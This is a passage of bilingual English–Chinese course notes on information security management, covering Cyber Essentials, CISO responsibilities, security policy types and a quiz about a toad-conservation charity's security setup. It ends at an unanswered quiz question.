chain.</p></li></ul><blockquote><ul><li><p>CE是由英国政府与标准和私营部门的组织（IASME，ISF，BSI）在2014年合作推出的。</p></li><li><p>目标：”基本控制措施，帮助组织保护自己免受常见的非目标网络攻击”</p></li><li><p>不仅适用于中小企业，对他们来说，基本的可负担的网络卫生特别有吸引力。</p></li><li><p>英国政府和私人公司（惠普）将其作为其供应链的强制措施。</p></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f8.png"></p><p>The 5 security controls of Cyber Essentials seem to provide a basic level of cyber hygiene. </p><ul><li>Vast majority of ‘commodity-level’ attacks would be mitigated.</li><li>Cyber Essentials was not designed to address more advanced, targeted attacks (Insider threats, APTs)  - Organisations facing these threats may need to implement additional measures </li><li>10 steps to cyber security -&gt; User Education and Awareness, and Network and Systems monitoring</li></ul><blockquote><ul><li>绝大多数的 “商品级 “攻击将被缓解。</li><li>Cyber Essentials的设计不是为了解决更高级的、有针对性的攻击（内部威胁，APTs）- 面对这些威胁的组织可能需要实施额外的措施 </li><li>网络安全的10个步骤 -&gt; 用户教育和意识，以及网络和系统监控</li></ul></blockquote><p>Actionable collaborative threat information to provide further help</p><ul><li>NCSC’s Cyber security information sharing partnership CiSP </li><li>Timely CE patch management </li><li>Extra feeds for website blacklisting – complement CE antimalware control </li><li>Black list of devices known to be flawed (vulns not mitigated by CE) </li><li>Initiatives need to consider lack of resources / know-how in SMEs</li></ul><blockquote><ul><li>NCSC的网络安全信息共享伙伴关系CiSP </li><li>及时的CE补丁管理 </li><li>额外的网站黑名单馈送 - 补充CE反恶意软件控制 </li><li>已知有缺陷的设备的黑名单（CE没有缓解的漏洞）</li><li>倡议需要考虑中小型企业的资源/知识的缺乏</li></ul></blockquote><p>SME reliance on service providers: </p><ul><li>SMEs may not be the last node in the supply chain! </li><li>Extensive use of cloud-based services </li><li>e.g. Google, Microsoft, Dropbox, Amazon, … </li><li>This reduces attack surface locally but also makes SMEs security depend on the security of service providers. </li><li>Security as a dimension to consider for provider selection.</li></ul><blockquote><ul><li>中小企业可能不是供应链上的最后一个节点! </li><li>广泛使用基于云的服务 </li><li>例如：谷歌，微软，Dropbox，亚马逊，… </li><li>这减少了本地的攻击面，但也使中小企业的安全依赖于服务提供商的安全。</li><li>安全是选择供应商时需要考虑的一个维度。</li></ul></blockquote><h3 id="Challenge-End-users-utilising-personal-technologies-or-third-party-services"><a href="#Challenge-End-users-utilising-personal-technologies-or-third-party-services" class="headerlink" title="Challenge: End-users utilising personal technologies or third-party services"></a>Challenge: End-users utilising personal technologies or third-party services</h3><p>BYOD and ‘shadow IT’ in remote working during COVID pandemic</p><h3 id="quiz-3"><a href="#quiz-3" class="headerlink" title="quiz"></a>quiz</h3><p>What is an evasion attack in the context of risks stemming from the use of Machine Learning?</p><p>Evasion attacks on a machine learning model, are those attacks where malicious objects are deliberately transformed to make the machine learning model make wrong predictions. For instance, a software binary can be manipulated to make a machine-learning based anti-malware model predict that it is not malware.</p><blockquote><p>对机器学习模型的规避攻击，是指那些故意改造恶意对象以使机器学习模型做出错误预测的攻击。例如，一个软件的二进制文件可以被操纵，使基于机器学习的反恶意软件模型预测它不是恶意软件</p></blockquote><h2 id="Security-Organisation-Policies-and-Compliance"><a href="#Security-Organisation-Policies-and-Compliance" class="headerlink" title="Security Organisation, Policies, and Compliance"></a>Security Organisation, Policies, and Compliance</h2><h3 id="Security-culture"><a href="#Security-culture" class="headerlink" title="Security culture"></a>Security culture</h3><p>Information Security is more than just technical countermeasures. It is as much about people as it is about anything else. People have to be <strong>educated</strong>, <strong>motivated</strong> and appropriately <strong>regulated</strong>.</p><blockquote><p> 信息安全不仅仅是技术对策。它既关乎人，也关乎其他任何事情。人们必须接受教育、激励和适当的监管。</p></blockquote><p>It must be clear within the organisation that Information Security is important. This is because a significant number of Information Security incidents are simply human error, mistakes or carelessness!</p><blockquote><p>组织内部必须清楚地认识到信息安全的重要性。这是因为大量的信息安全事件仅仅是人为的错误、失误或粗心大意!</p></blockquote><p>Information Security needs the cooperation and collaboration of multiple stakeholders across the organisation to foster a suitable culture.</p><blockquote><p>信息安全需要整个组织的多个利益相关者的合作和协作，以培养一种合适的文化</p></blockquote><h3 id="CISO-Chief-Information-Security-Officer"><a href="#CISO-Chief-Information-Security-Officer" class="headerlink" title="CISO Chief Information Security Officer"></a>CISO Chief Information Security Officer</h3><p>The CISO is the top Information Security manager in an organisation. They are responsible for protecting their organisation’s computers, networks and data against threats, such as security breaches, computer viruses or attacks by cyber-criminals.</p><blockquote><p>组织的最高信息安全经理。他们负责保护其组织的计算机、网络和数据免受威胁，如安全漏洞、计算机病毒或网络犯罪分子的攻击</p></blockquote><p>Focus</p><ul><li>What risks may the enterprise face?</li><li>Where may the enterprise be vulnerable to attack?</li><li>What controls are in place?</li></ul><blockquote><p>企业可能面临哪些风险？<br>企业在哪些方面可能容易受到攻击？<br>有哪些控制措施？</p></blockquote><p>Information Security responsibilities</p><ul><li>Coordinating Information Security activities across the enterprise.</li><li>Reporting effectiveness of security policy to senior management.</li><li>Coordinating the production of security policy.</li></ul><blockquote><p>协调整个企业的信息安全活动<br>向高级管理层报告安全政策的有效性<br>协调安全政策的制定</p></blockquote><p>Supporting the organisation</p><ul><li>Understanding the enterprise’s risk appetite and profile and how it may be evolving.</li><li>Providing expert advice on Information Security matters to the enterprise.</li><li>Creating a culture of good information exchange and security practices.</li></ul><blockquote><p>了解企业的风险偏好和概况，以及它可能的演变情况<br>向企业提供有关信息安全事务的专家建议<br>创造一种良好的信息交流和安全实践的文化</p></blockquote><p>The CISO is a senior role within the organisation, ideally a board member. Why is this important?</p><p><strong>Authority within the organisation</strong></p><ul><li>A director or board member has the necessary status to ensure appropriate focus is placed on Information Security.</li><li><em>Sarbanes-Oxley</em> (USA) and <em>The Companies Act</em> (UK) also <strong>require</strong> this level of accountability/responsibility.</li></ul><blockquote><p>组织内的权力</p><p>董事或董事会成员具有必要的地位，以确保对信息安全的适当关注<br>萨班斯-奥克斯利法案（美国）和公司法（英国）也要求这种程度的责任/义务</p></blockquote><p><strong>External incentive</strong></p><ul><li>There is a responsibility to ensure adequate service continuity requirements are in place. If there is a major problem, the company won’t go out of operation.</li><li>If measures are not properly implemented, the accountable person can face a custodial sentence.</li></ul><blockquote><p>外部激励</p><p>有责任确保足够的服务连续性要求到位。如果出现了重大问题，公司就不会停业<br>如果措施执行不力，责任人可能会面临监禁的处罚</p></blockquote><p>What initial steps should every new CISO take?</p><p>Looking where your organisation is, what’s in place, how it’s working, how resilient your systems are, how effective your systems are – prevention, detection and response – looking for obvious holes and then trying to make the organisation better in one or more of those three areas, and it’s gonna depend. Making the organisation more resilient is important. </p><blockquote><p>看看你的组织在哪里，有什么，它是如何工作的，你的系统有多大的弹性，你的系统有多大的效力–预防、检测和响应–寻找明显的漏洞，然后试图在这三个领域中的一个或多个领域使组织变得更好。使组织更有弹性是很重要的。</p></blockquote><p>How should a CISO discuss cybersecurity with their CEO and Board of Directors?</p><p>CISO should recognise that this is much more of a political job than a technical job, and talking to the board and talking to the CEO is probably the most important thing a CISO can do. It’s easier now. I think in the past couple of years security has gotten much more board-level visibility, and questions are coming down: how can you make sure we’re not the next Sony? How can you make sure we’re not the next Target or Home Depot? What are you doing to prevent these catastrophic risks?</p><p>So, I think the CISO is better armed today than ever before with authority to make changes and do things, simply because of what’s on the front page of newspapers every week it seems. So this is a tough job but that’s what a CISO is hired to do, and making that happen is the most important thing a CISO can do.</p><blockquote><p>CISO应该认识到这是一项政治性的工作，而不是技术性的工作，与董事会交谈和与CEO交谈可能是CISO能做的最重要的事情。现在更容易了。我认为在过去的几年里，安全问题在董事会层面得到了更多的关注，问题也随之而来：你如何确保我们不会成为下一个索尼？你如何确保我们不是下一个Target或Home Depot？你正在做什么来防止这些灾难性的风险？</p><p>因此，我认为今天的CISO比以往任何时候都更有权力做出改变和做事，仅仅是因为每周报纸的头版似乎都有什么。因此，这是一项艰难的工作，但这正是CISO被雇用来做的事情，而实现这一目标是CISO可以做的最重要的事情。</p></blockquote><h3 id="other-key-roles"><a href="#other-key-roles" class="headerlink" title="other key roles"></a>other key roles</h3><h4 id="Security-forum"><a href="#Security-forum" class="headerlink" title="Security forum"></a>Security forum</h4><p>Generally, a security forum should be constituted of stakeholders who require good Information Security and those who are going to arrange it. 一个安全论坛应该由较为擅长信息安全的利益相关者和将要安排它的人组成</p><p>This may include:</p><ul><li>line-of-business managers</li><li>departmental heads</li><li>representatives from vested interest parties (eg IT, internal audit, HR, physical security)</li></ul><blockquote><p>业务线经理<br>部门主管<br>来自既得利益方的代表（如IT、内部审计、人力资源、物理安全）</p></blockquote><p>The forum should:</p><ul><li>ensure Information Security is included in the planning of all activities for the enterprise</li><li>approve and prioritise security activities</li><li>review the performance of security activities and assess whether the risk profile of the enterprise has altered (ie are there new threats?)</li><li>approve policies, standards and procedures in relation to Information Security.</li></ul><blockquote><p>确保信息安全被纳入企业所有活动的规划中<br>批准并确定安全活动的优先次序<br>审查安全活动的表现，评估企业的风险状况是否已经改变（即是否有新的威胁？）<br>批准与信息安全有关的政策、标准和程序</p></blockquote><h4 id="System-administrator"><a href="#System-administrator" class="headerlink" title="System administrator"></a>System administrator</h4><p>A person who manages the operation of a computer system or a particular electronic communication service.</p><p>管理计算机系统或特定电子通信服务运行的人</p><h4 id="Security-auditor"><a href="#Security-auditor" class="headerlink" title="Security auditor"></a>Security auditor</h4><p>A person who works with a company to provide an audit of security systems used by that company.</p><p>与一家公司合作，对该公司使用的安全系统进行审计的人</p><h4 id="System-user"><a href="#System-user" class="headerlink" title="System user"></a>System user</h4><p>A person who interacts with a system, typically through an interface, to extract some functional benefit.</p><p>与系统互动的人，通常是通过一个界面，以获得一些功能上的好处</p><h4 id="Incident-response-member"><a href="#Incident-response-member" class="headerlink" title="Incident response member"></a>Incident response member</h4><p>A person who is part of the incident response team. They are responsible for resolving incidents as they arise.</p><p>事件响应成员</p><p>属于事件响应团队的人。他们负责解决出现的事件</p><h4 id="Security-champion"><a href="#Security-champion" class="headerlink" title="Security champion"></a>Security champion</h4><p>A person who is appointed to oversee the enforcement of security policies within their group and to report incidents to management.</p><p>安全卫士</p><p>被任命监督其集团内安全政策的执行并向管理层报告事件的人</p><h4 id="Security-officer-guard"><a href="#Security-officer-guard" class="headerlink" title="Security officer/guard"></a>Security officer/guard</h4><p>A person employed by the organisation to protect the assets from a variety of hazards by enforcing preventative measures.</p><p>由组织雇用的人员，通过执行预防措施保护资产免受各种危害</p><h3 id="security-policies"><a href="#security-policies" class="headerlink" title="security policies"></a>security policies</h3><p>The organisational security policy expresses the organisation’s <strong>overall approach to security</strong>. 组织的安全政策表达了组织对安全的整体态度 It may include:</p><ul><li>the organisation’s security objectives</li><li>corporate roles and responsibilities</li><li>compliance requirements for external regulations and legislation</li><li>a generic analysis of the risk to the business</li><li>disciplinary penalties for non-compliance with the policy.</li></ul><blockquote><ul><li>组织的安全目标</li><li>企业角色和责任</li><li>对外部法规和立法的遵守要求</li><li>对企业风险的一般性分析</li><li>对不遵守政策的纪律处罚。</li></ul></blockquote><p>The organisational security policy tops a hierarchy of linked and interdependent system security policies, and other policies too: 组织安全政策是一个由相互联系和相互依赖的系统安全政策以及其他政策组成的层次结构</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f9.png"></p><p>incident reporting informs the organisational security policy about the actual risk and about what security is needed. 事件报告为组织的安全政策提供了关于实际风险和所需安全的信息</p><h5 id="Policy"><a href="#Policy" class="headerlink" title="Policy"></a>Policy</h5><p>A high-level statement of an organisation’s values, goals and objectives in a specific area. 组织在特定领域的价值观、目标和目的的高级声明</p><p>A policy doesn’t say how it should be implemented, but it states the <strong>end-goal</strong>. 不会说应该如何实施，但它说明了最终目标</p><p><strong>Example:</strong> ‘Each user is responsible for creating and maintaining their system passwords’. 每个用户负责创建和维护其系统密码</p><h5 id="Standard"><a href="#Standard" class="headerlink" title="Standard"></a>Standard</h5><p>More <strong>prescriptive</strong> than a policy, a standard quantifies what needs to be done and provides consistency in controls that can be measured. 比政策更具规范性，它量化了需要做的事情，并提供可衡量的控制措施的一致性</p><p>Designed to support policy and states what <strong>must</strong> be done and how it should be achieved. 旨在支持政策，说明必须做什么以及如何实现</p><p><strong>Example:</strong> ‘Passwords must contain a minimum of eight characters, be a mix of numbers and letters and be changed every 30 days’ (nb while this is a widespread standard, it is a really bad standard to implement). 密码必须包含至少8个字符，由数字和字母混合而成，并且每30天更换一次”（注：虽然这是一个广泛的标准，但这是一个非常不好实施的标准）</p><h5 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h5><p>A set of detailed working instructions that describe <strong>what</strong>, <strong>when</strong>, <strong>how</strong> and <strong>by whom</strong> something should be done. 一套详细的工作指令，描述了什么、何时、如何以及由谁来做某事</p><p><strong>Example:</strong> ‘Our password standard must be reviewed every six months based on the new advice provided by regulatory organisations. This will be completed by Jose Such. Signed, Ms Rachel Jackson (Chairperson of GANT)’. 我们的密码标准必须每六个月根据监管组织提供的新建议进行审查。这将由Jose Such完成。签名，Rachel Jackson女士（GANT主席）</p><h5 id="Guideline"><a href="#Guideline" class="headerlink" title="Guideline"></a>Guideline</h5><p>Guidelines provide advice, direction and best practice in instances where it is often difficult to regulate how something should be done. 指南提供建议、指导和最佳做法，在这种情况下，往往很难规范应该如何做某事</p><p><strong>Example:</strong> Our products, features, and services should make Google more useful for all our users. We have many different types of users, from individuals to large businesses, but one guiding principle: Is what we are offering useful?</p><blockquote><p>我们的产品、功能和服务应该使谷歌对我们所有的用户更有用。我们有许多不同类型的用户，从个人到大型企业，但有一个指导原则：我们所提供的东西有用吗？</p></blockquote><h5 id="Externally-imposed-requirements"><a href="#Externally-imposed-requirements" class="headerlink" title="Externally imposed requirements"></a>Externally imposed requirements</h5><p>Statutory requirements</p><p>Statutory requirements are legal requirements that must be fulfilled. For instance, law enforcement agencies must be contacted should certain laws be broken or are suspected of being broken – eg the downloading of child pornography.</p><blockquote><p>法定要求是必须满足的法律要求。例如，如果违反或涉嫌违反某些法律，例如下载儿童色情制品，必须与执法机构联系</p></blockquote><p>They may also influence how an enterprise’s incident reporting procedures are organised. For example who, when and how should contact the authorities? Privacy legislation such as the Data Protection Act (UK) will influence how information, particularly personal data, is stored and managed within the enterprise, as well as how resources are deployed to ensure that it complies with this legislation.</p><blockquote><p>它们还可能影响企业的事件报告程序的组织方式。例如，谁、何时以及如何与当局联系？诸如《数据保护法》（英国）等隐私立法将影响到企业内部如何存储和管理信息，特别是个人数据，以及如何部署资源以确保其符合这一立法</p></blockquote><p>Regulatory requirements</p><p>Regulatory requirements are another kind of external requirement. Those are often imposed by trade bodies, and they specify how an enterprise should operate to conform to certain standards.</p><blockquote><p>监管要求是另一种外部要求。这些要求通常是由贸易机构施加的，它们规定了一个企业应该如何运作以符合某些标准</p></blockquote><p>Although they are not legal obligations, regulatory bodies have extensive powers, and failure to comply could lead to possible fines or, in extreme cases, exclusion from trading in a particular environment. The finance sector is a good example of this as it maintains strict controls to prevent financial malpractices such as fraud or money laundering.</p><blockquote><p>虽然它们不是法律义务，但监管机构有广泛的权力，如果不遵守，可能会导致罚款，或者在极端情况下，被排除在特定环境的交易之外。金融部门就是一个很好的例子，因为它保持着严格的控制，以防止欺诈或洗钱等金融不良行为</p></blockquote><p>Advisory requirements</p><p>Advisory requirements may arise from government agencies or utility companies and may provide advice as to what arrangements should be put into place to help cope with instances such as fires, natural disasters and acts of terrorism.</p><p>These requirements are not legally binding and are generally issued to help encourage best practice.</p><blockquote><p>咨询性要求可能来自政府机构或公用事业公司，并可能提供建议，说明应作出何种安排以帮助应对火灾、自然灾害和恐怖主义行为等情况</p><p>这些要求没有法律约束力，通常是为了帮助鼓励最佳做法而发布的</p></blockquote><h4 id="examples-of-policies-and-procedures"><a href="#examples-of-policies-and-procedures" class="headerlink" title="examples of policies and procedures"></a>examples of policies and procedures</h4><p>a high-level view of how the organisation will address its security needs (and help focus on implementing controls that address the risks that matter most)</p><blockquote><p>对组织如何满足其安全需求的高瞻远瞩（并帮助集中实施解决最重要风险的控制措施）</p></blockquote><table><thead><tr><th align="left">Impact of programme</th><th>How the programme will address risks within the enterprise and reduce them to an acceptable level. 方案将如何解决企业内的风险，并将其减少到可接受的水平</th></tr></thead><tbody><tr><td align="left">Security controls</td><td>What controls need to be implemented to achieve reduced risk. 为实现降低风险，需要实施哪些控制</td></tr><tr><td align="left">Level of effort</td><td>Who is involved in implementing the program and how much time is required. 谁参与实施该方案，需要多少时间</td></tr><tr><td align="left">Accountability</td><td>Who is responsible for each part of the programme.</td></tr><tr><td align="left">Costs and timescales</td><td>What the timeline to complete each goal is and how cost-effective it is. 完成每个目标的时间表是什么，其成本效益如何</td></tr><tr><td align="left">Tracking progress</td><td>How progress will be tracked. 如何追踪进展</td></tr></tbody></table><h4 id="Security-strategy-and-architecture"><a href="#Security-strategy-and-architecture" class="headerlink" title="Security strategy and architecture"></a>Security strategy and architecture</h4><p><strong>Security strategy</strong> is a plan on how to <strong>improve an existing assurance function</strong> within an organisation. It is higher-level, non-technical and less detailed than an implementation programme, typically on a timescale of three-five years.</p><blockquote><p>安全战略是一个关于如何改善组织内现有保证功能的计划。它是更高层次的，非技术性的，没有实施方案那么详细，通常是以三到五年为一个时间尺度</p></blockquote><p>It describes how the risk profile of the enterprise will likely change due to business working practices and objectives, and explores trends in threats/vulnerabilities to potential types of incidents. It details the expected developments in software and hardware, and the legal, compliance and audit requirement changes.</p><blockquote><p>它描述了企业的风险状况将如何因业务工作实践和目标而发生变化，并探讨了潜在事件类型的威胁/脆弱性的趋势。它详细说明了软件和硬件的预期发展，以及法律、合规和审计要求的变化</p></blockquote><p><strong>Security architecture</strong> translates organisational requirements for assurance into a <strong>set of controls to protect information assets</strong>. It supports moving from a high-level conception view of controls to a detailed specification and design.</p><blockquote><p>安全架构将组织对保证的要求转化为一套保护信息资产的控制。它支持从高层次的控制概念到详细的规范和设计</p></blockquote><p>It focuses on technology, policies, processes, procedures, and user behaviour. It also contains a set of <strong>principles</strong> to express the type of controls to be implemented, and the auditing and monitoring of controls themselves, which ensures that the organisation complies with security policies and legal obligations.</p><blockquote><p>它的重点是技术、政策、流程、程序和用户行为。它还包含了一套原则来表达要实施的控制类型，以及对控制本身的审计和监控，从而确保组织遵守安全政策和法律义务</p></blockquote><h4 id="End-user-code-of-practice"><a href="#End-user-code-of-practice" class="headerlink" title="End-user code of practice"></a>End-user code of practice</h4><p>The end-user code of practice <strong>defines the standards</strong> for use of organisational information and communication systems by employees. 端用户业务守则规定了雇员使用组织信息和通信系统的标准 It addresses the following aspects:</p><table><thead><tr><th align="left">Security area</th><th align="left">Example of standards</th></tr></thead><tbody><tr><td align="left">Credential protection 凭证保护</td><td align="left">protecting user passwords and PINs.</td></tr><tr><td align="left">Access control</td><td align="left">1. users only access information that they have the authorisation to see 2. users report if they can access information that they do not need to know. 1. 用户只能访问他们有权限查看的信息 2. 如果用户可以访问他们不需要知道的信息，他们会报告</td></tr><tr><td align="left">Physical security</td><td align="left">1. logging off workstations when unattended 2. locking desk drawers. 锁定办公桌的抽屉</td></tr><tr><td align="left">Culture in the workplace</td><td align="left">1. challenging people walking in restricted areas without a pass 2. not letting people enter through doors behind you without checking their ID. 1. 对没有通行证的人在限制区域行走提出质疑 2. 不让别人在没有检查身份的情况下从你身后的门进入</td></tr><tr><td align="left">Personal devices</td><td align="left">1. clarifying whether they can be used for work 2. clarifying whether they can be brought into the workplace at all (eg GCHQ employees cannot bring their phones into work).</td></tr><tr><td align="left">Social engineering</td><td align="left">1. avoid passing amusing emails around as attachment might contain viruses 2. employees may not accept gifts or freebies.</td></tr></tbody></table><h4 id="Contract-of-employment"><a href="#Contract-of-employment" class="headerlink" title="Contract of employment"></a>Contract of employment</h4><p>Employees should be <strong>contractually</strong> obliged to follow the security policies. The contract of employment can outline the following areas:</p><table><thead><tr><th align="left">Acceptance of standards</th><th>1. behaviour and conduct 2. use of company assets 3. duty of care to organisation and other staff.</th></tr></thead><tbody><tr><td align="left">Intellectual property</td><td>1. clarifying who owns the IP 2. non-disclosure/confidentiality of information. 信息的不披露/保密性</td></tr><tr><td align="left">Applicable laws and regulations 适用的法律和法规</td><td>1. employee is legally accountable for their actions 2. clearly states the legal framework for their role.  明确说明其角色的法律框架</td></tr><tr><td align="left">Disciplinary proceedings and process 惩戒程序和过程</td><td>1. accountability for the employee 2. risk of suspension, etc. 停职的风险</td></tr></tbody></table><h4 id="Considerations-and-tips-for-writing-policy-documents"><a href="#Considerations-and-tips-for-writing-policy-documents" class="headerlink" title="Considerations and tips for writing policy documents"></a>Considerations and tips for writing policy documents</h4><p>There are many considerations for writing policy. It should ideally be clear and to the point with little to no jargon. It should use positive rather than negative statements (avoid ‘do not…’), and have a clear scope (ie ‘to all GANT employees in the UK’).</p><blockquote><p>政策应清晰明了，切中要害，几乎没有专业术语。它应该使用积极而非消极的表述（避免 “不要……”），并有明确的范围（即 “针对英国所有GANT员工”）</p></blockquote><p>A policy must strike the right balance. It must consider the financial cost and impact on working conditions if the policy is enforced.</p><blockquote><p>一项政策必须取得适当的平衡。它必须考虑 如果该政策得到执行 财务成本和对工作条件的影响</p></blockquote><p>A policy should be <strong>realistic</strong> and <strong>enforceable</strong>. Whilst a policy which stipulates that employees must keep laptops with them at all times is admirable, a more realistic policy could settle on employees not leaving laptops unattended in public spaces. Similarly, a policy which says that no customer records should be kept without the customer’s consent is potentially not enforceable. The policy should say that consent needs to be obtained before storing customer data.</p><blockquote><p>一项政策应该是现实的和可执行的。虽然规定员工必须随时携带笔记本电脑的政策是令人钦佩的，但一个更现实的政策可以解决员工不把笔记本电脑留在公共场所无人看管的问题。同样，一项规定未经客户同意不得保存客户记录的政策也可能无法执行。政策应该说，在存储客户数据之前，需要获得同意</p></blockquote><p>Policies should also ensure the segregation of duties, that is, that one person may not perform the duties for more than one role where there can be a conflict of interests. The requirement for segregation of duties addresses two key risks.</p><blockquote><p>政策还应该确保职责分离，也就是说，一个人不得为可能存在利益冲突的一个以上的角色履行职责。职责分离的要求解决了两个关键风险</p></blockquote><p>What is the risk of one individual having all the passwords, access rights and privileges for the entire organisation?</p><p>They can destroy all data with little to no risk of discovery. One way to deal with that risk is to limit the scope of one role by creating several roles such as system administrator, system user and system auditor.</p><p>The person could also resign or fall ill. Limiting dependence through overlapping responsibilities and good documentation are some ways of mitigating this risk.</p><blockquote><p>他们可以破坏所有的数据而几乎没有被发现的风险。处理这种风险的方法之一是通过创建几个角色来限制一个角色的范围，如系统管理员、系统用户和系统审计师</p><p>这个人也可以辞职或生病。通过重叠的责任和良好的文件来限制依赖性是减轻这种风险的一些方法</p></blockquote><p>In case <strong>third parties</strong> require access to assets, the organisational policies, standards and procedures should be extended to include them. There must be a written and signed agreement with the third party before access to information is permitted, with a Non-Disclosure Agreement (NDA) potentially being required to protect assets and intellectual property. Crucially, assets should <strong>not</strong> be transferred until the organisation is confident that the third party can adequately protect its confidentiality (and possibly integrity).</p><blockquote><p>如果第三方需要访问资产，组织的政策、标准和程序应扩展到包括他们。在允许获取信息之前，必须与第三方签订书面协议，并可能需要签订保密协议（NDA）以保护资产和知识产权。最重要的是，在组织确信第三方能够充分保护其机密性（可能还有完整性）之前，不应转让资产</p></blockquote><p>Some things a third party agreement could cover:</p><ul><li>notifying and investigating assurance incidents</li><li>right to audit/monitor arrangements by third party</li><li>managing changes to application or service</li><li>ensuring all policies extend to third party and their subcontractors</li><li>running background checks on recruited personnel (GCHQ-like).</li></ul><blockquote><ul><li>通知和调查保证事件</li><li>第三方审计/监督安排的权利</li><li>管理应用程序或服务的变更</li><li>确保所有政策适用于第三方和他们的分包商</li><li>对招聘的人员进行背景调查（类似于GCHQ）</li></ul></blockquote><p>The consequences for not complying must also be clearly stated in the policy. 政策中还必须明确说明不遵守的后果 Possible consequences include:</p><ul><li>reporting the breach to law enforcement</li><li>employee disciplinary process</li><li>termination of a supplier contract</li></ul><blockquote><ul><li>向执法部门报告违规行为</li><li>雇员的纪律处分程序</li><li>终止供应商合同</li></ul></blockquote><h3 id="quiz-4"><a href="#quiz-4" class="headerlink" title="quiz"></a>quiz</h3><p>Natterjack蟾蜍欣赏小组（GANT）是一个保护团体，热衷于促进和保护Nutterjack蟾蜍的福祉。它是一个在英国注册的慈善机构，在全世界拥有大量的成员，他们都热衷于促进GANT的工作。</p><p>不幸的是，有关的蟾蜍是一种濒危物种，由于新地区的开发，它正在逐渐被破坏。例如，由于开发工作，它在威尔士的一些地区已经局部灭绝，不得不重新引进。</p><p>该小组的所有信息都可以通过网络应用来获取，或者通过联系小组的名誉秘书简-皮博迪博士来获取纸质记录。这些信息包括该小组的成员记录、活动、会议地点、Natterjack Toad的栖息地、关于他们工作的保密方面等。在过去，成员们提出了对信息保障的担忧，因为网站以前曾因服务器没有重要的安全控制而被破坏过。</p><p>主席Rachel Jackson女士听说过信息安全，并认为现在是更认真对待信息安全的时候，但她对这个问题了解不多。这就是你进来的地方。瑞秋-杰克逊女士聘请了你们小组来学习更多关于保护他们的信息。</p><h4 id="Q1-3"><a href="#Q1-3" class="headerlink" title="Q1"></a>Q1</h4><p>Which security roles and teams would you suggest that GANT should have?</p><p>Given the size of GANT, it would probably make sense to have a <strong>CISO</strong>, or alternatively somebody that could partially play the role of a CISO at the board level, together with a <strong>Security Forum</strong> of people playing a different role in the organisation and contributing to Information Security from their day-to-day job.</p><p>This could also include specific security roles, including system administrator (most notably of the website and related systems), but others may be possible too if GANT has enough resources.</p><blockquote><p>考虑到GANT的规模，设立一个<strong>CISO</strong>，或者某个可以在董事会层面部分扮演CISO角色的人，再加上一个<strong>安全论坛</strong>，这些人在组织中扮演不同的角色，并在日常工作中为信息安全做出贡献</p><p>这也可以包括特定的安全角色，包括系统管理员（最明显的是网站和相关系统），但如果GANT有足够的资源，其他角色也是可能的</p></blockquote><h4 id="Q2-3"><a href="#Q2-3" class="headerlink" title="Q2"></a>Q2</h4><p>Ms Jackson is unsure about the level a CISO may be placed in GANT’s hierarchy. Where should a CISO be put and why?</p><p>The CISO should ideally be part of the board of directors of GANT. This is due to a number of reasons, which we could divide into two categories:</p><p><strong>Authority within the organisation</strong></p><ul><li>It will ensure that the CISO is seen as a senior role, demonstrating from the ‘higher-ups’ a real commitment to Information Security in GANT. 这将确保CISO被视为一个高级角色，从 “上级 “那里显示出对GANT信息安全的真正承诺</li><li>A director or board member has the necessary status to ensure appropriate focus is placed on Information Security.</li><li><em>Sarbanes-Oxley</em> (USA) and <em>The Companies Act</em> (UK) also <strong>require</strong> this level of accountability/responsibility.</li></ul><p><strong>External incentive</strong></p><ul><li>There is a responsibility to ensure adequate service continuity requirements are in place. Therefore, if there is a major problem, the company won’t go out of operation.</li><li>If measures are not properly implemented, the accountable person can face a custodial sentence.</li></ul><h4 id="Q3-3"><a href="#Q3-3" class="headerlink" title="Q3"></a>Q3</h4><p>Ms Jackson has asked you to prepare an end-user code of practice for GANT. Identify the main areas that you would include in the policy.</p><p>An end-user code of practice for GANT could include, but not exclusively, （但不限于） statements on:</p><ul><li>access to GANT systems</li><li>protection of passwords</li><li>leaving information unattended</li><li>measures required to protect information about GANT members</li><li>protection of information and equipment if taken out of GANT’s office</li><li>acceptable behaviour when using GANT systems</li><li>use of the internet while using GANT systems</li><li>use of GANT systems for personal use</li></ul><blockquote><ul><li>GANT系统的访问</li><li>密码的保护</li><li>信息无人看管</li><li>保护GANT会员信息所需的措施</li><li>保护带出GANT办公室的信息和设备</li><li>使用GANT系统时可接受的行为</li><li>在使用GANT系统时使用互联网</li><li>将GANT系统用于个人用途</li></ul></blockquote><h4 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h4><p>Ms Jackson is worried that GANT’s controls for protecting personal information may be weak. She has asked you to carry out a review of the privacy legislation affecting GANT to ensure that the organisation is compliant. What are the main areas that you would look at? 对影响GANT的隐私法规进行审查，以确保该组织符合规定。你将关注的主要领域是什么？</p><p>The Data Protection Act in the UK would be the main source. It is a refinement of the European GDPR.</p><p>Then, it would be a matter of looking at how GANT is storing and using personal information and whether that is compliant with this body of legislation, particularly in terms of which systems in GANT deal with personal information and what kind of security controls (if any) are in place. It seems clear that the database that powers the website with members’ details would be a good place to look at together with the paper-based information GANT holds.</p><blockquote><p>要看GANT是如何存储和使用个人信息的，以及这是否符合该法律体系，特别是在GANT的哪些系统处理个人信息和什么样的安全控制（如果有）方面。显然，为网站提供会员信息的数据库和GANT持有的纸质信息将是一个很好的研究对象</p></blockquote><p>Also, we should look at whether personal information is used or passed on to other legislations (note at the beginning that GANT has 100,000 members worldwide from 42 different countries). This would be important to understand too.</p><blockquote><p>还应该关注个人信息是否被使用或传递给其他立法机构（请注意，GANT在全球拥有来自42个不同国家的10万名会员）。了解这一点也很重要</p></blockquote><p>Other issues that could be examined might include:</p><ul><li>identifying whether there is a policy in place to specify how personal information should be held and whether it is up to date</li><li>identifying who has access to the information and whether they understand their responsibilities</li><li>identifying whether any information is shared with third parties and if so what controls are in place</li><li>understanding what monitoring takes place and whether this complies with local legislation</li><li>identifying whether the enterprise has communicated to individuals what monitoring takes place.</li></ul><blockquote><ul><li>确定是否有政策规定应如何保存个人信息，以及该政策是否是最新的</li><li>确定谁可以接触到这些信息，以及他们是否了解自己的责任</li><li>确定是否与第三方共享任何信息，如果是，有哪些控制措施</li><li>了解发生了什么监测，以及这是否符合当地法律规定</li><li>确定企业是否已向个人传达了所进行的监测</li></ul></blockquote><h4 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h4><p>Beyond issues specific to CISOs and their team, CISOs also face challenges from the broader business. According to the report, what are those challenges? Explain 